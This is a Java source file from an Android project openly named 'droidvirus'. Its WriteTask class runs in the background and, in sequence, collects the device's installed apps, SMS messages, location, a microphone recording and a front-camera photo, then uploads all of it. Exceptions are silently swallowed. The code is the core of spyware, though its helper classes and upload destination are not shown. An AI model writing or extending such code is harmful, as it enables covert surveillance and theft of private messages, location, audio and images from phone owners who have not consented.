package com.artisanter.droidvirus;

import android.content.Context;
import android.os.AsyncTask;

public class WriteTask extends AsyncTask<Context, String, Boolean> {
    @Override
    protected Boolean doInBackground(Context... contexts) {
        try {
            Context context = contexts[0];
            AppSpy.writeApps(context);
            SMSSpy.writeSMS(context);
            LocationSpy.writeLocation(context);
            AudioSpy.writeAudio(context, Constants.AUDIO_TIME);
            CameraSpy.writeFrontPhoto(context);
            Thread.sleep(Constants.AUDIO_TIME * 1000 + 3000);
            Uploader.uploadAll(context);
            return Boolean.TRUE;
        }
        catch (Exception ignored){
            return Boolean.FALSE;
        }
    }
}
